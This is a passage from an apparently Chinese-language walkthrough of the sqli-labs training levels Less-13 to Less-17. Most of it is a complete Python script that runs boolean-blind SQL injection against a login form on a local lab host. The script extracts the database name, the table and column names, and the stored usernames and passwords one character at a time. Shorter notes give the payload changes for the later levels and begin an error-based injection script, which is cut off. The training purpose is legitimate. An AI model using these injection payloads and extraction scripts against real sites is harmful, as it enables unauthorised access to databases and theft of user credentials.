        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-28%20093349.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-28%20093349.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-28%20093349.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-10-28%20093349.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-10-28%20093349.png" /></p>
<p>传入<code>uname=1') or 1=2#&amp;passwd=123</code>返回的<code>Content-Length</code>为<code>1454</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-28%20093452.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-28%20093452.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-28%20093452.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-28%20093452.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-10-28%20093452.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-10-28%20093452.png" /></p>
<p>由此可以进行布尔盲注</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://127.0.0.1/Less-13/&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># len(r.text) correct 1493 error 1454</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_database_length</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;uname&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39;) or length(database())=</span><span class="si">%d</span><span class="s2">#&#34;</span> <span class="o">%</span> <span class="n">i</span><span class="p">,</span> <span class="s2">&#34;passwd&#34;</span><span class="p">:</span> <span class="s2">&#34;123&#34;</span><span class="p">,</span> <span class="s2">&#34;submit&#34;</span><span class="p">:</span> <span class="s2">&#34;submit&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1493</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_database_name</span><span class="p">(</span><span class="n">database_length</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">database_length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">low</span> <span class="o">=</span> <span class="mi">31</span>
</span></span><span class="line"><span class="cl">        <span class="n">high</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">low</span> <span class="o">&lt;</span> <span class="n">high</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;uname&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39;) or ascii(substr(database(),</span><span class="si">%d</span><span class="s2">,1))&gt;</span><span class="si">%d</span><span class="s2">#&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">mid</span><span class="p">),</span> <span class="s2">&#34;passwd&#34;</span><span class="p">:</span> <span class="s2">&#34;123&#34;</span><span class="p">,</span> <span class="s2">&#34;submit&#34;</span><span class="p">:</span> <span class="s2">&#34;submit&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1493</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_table_name</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">50</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">low</span> <span class="o">=</span> <span class="mi">31</span>
</span></span><span class="line"><span class="cl">        <span class="n">high</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">low</span> <span class="o">&lt;</span> <span class="n">high</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;uname&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39;) or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),</span><span class="si">%d</span><span class="s2">,1))&gt;</span><span class="si">%d</span><span class="s2">#&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">mid</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;passwd&#34;</span><span class="p">:</span> <span class="s2">&#34;123&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;submit&#34;</span><span class="p">:</span> <span class="s2">&#34;submit&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1493</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">mid</span> <span class="o">==</span> <span class="mi">31</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_column_name</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">low</span> <span class="o">=</span> <span class="mi">31</span>
</span></span><span class="line"><span class="cl">        <span class="n">high</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">low</span> <span class="o">&lt;</span> <span class="n">high</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;uname&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39;) or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),</span><span class="si">%d</span><span class="s2">,1))&gt;</span><span class="si">%d</span><span class="s2">#&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">mid</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;passwd&#34;</span><span class="p">:</span> <span class="s2">&#34;123&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;submit&#34;</span><span class="p">:</span> <span class="s2">&#34;submit&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1493</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">mid</span> <span class="o">==</span> <span class="mi">31</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_username</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">low</span> <span class="o">=</span> <span class="mi">31</span>
</span></span><span class="line"><span class="cl">        <span class="n">high</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">low</span> <span class="o">&lt;</span> <span class="n">high</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;uname&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39;) or ascii(substr((select group_concat(username) from users),</span><span class="si">%d</span><span class="s2">,1))&gt;</span><span class="si">%d</span><span class="s2">#&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">mid</span><span class="p">),</span> <span class="s2">&#34;passwd&#34;</span><span class="p">:</span> <span class="s2">&#34;123&#34;</span><span class="p">,</span> <span class="s2">&#34;submit&#34;</span><span class="p">:</span> <span class="s2">&#34;submit&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1493</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">mid</span> <span class="o">==</span> <span class="mi">31</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_password</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">low</span> <span class="o">=</span> <span class="mi">31</span>
</span></span><span class="line"><span class="cl">        <span class="n">high</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">low</span> <span class="o">&lt;</span> <span class="n">high</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;uname&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39;) or ascii(substr((select group_concat(password) from users),</span><span class="si">%d</span><span class="s2">,1))&gt;</span><span class="si">%d</span><span class="s2">#&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">mid</span><span class="p">),</span> <span class="s2">&#34;passwd&#34;</span><span class="p">:</span> <span class="s2">&#34;123&#34;</span><span class="p">,</span> <span class="s2">&#34;submit&#34;</span><span class="p">:</span> <span class="s2">&#34;submit&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1493</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">mid</span> <span class="o">==</span> <span class="mi">31</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">get_database_name</span><span class="p">(</span><span class="n">get_database_length</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">get_table_name</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">get_column_name</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">get_username</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">get_password</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="less-14">Less-14</h3>
<p>把Less-13的单引号换成双引号</p>
<h3 id="less-15">Less-15</h3>
<p>对传入的参数不进行错误回显,传入<code>uname=1' or 1=1#&amp;passwd=1</code>得到<code>Content-Length</code>为<code>1492</code>并提示登录成功</p>
<p>传入<code>uname=1' or 1=2#&amp;passwd=1</code>得到<code>Content-Length</code>为<code>1446</code>并提示登录失败</p>
<p>可知闭合方式为<code>'</code>,脚本同Less-13</p>
<h3 id="less-16">Less-16</h3>
<p>把Less-15的单引号换成<code>&quot;)</code></p>
<h3 id="less-17">Less-17</h3>
<p>传入<code>uname=admin&amp;passwd=1'</code>返回<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin'' at line 1</code></p>
<p>因此可以使用报错注入</p>
<p>提示: <code>You can't specify target table 'users' for update in FROM clause</code>不能select出表中某些值,再update这个表
解决方法: 再套一层循环,并对自循环的结果赋予别名</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://127.0.0.1/Less-17/&#34;</span>
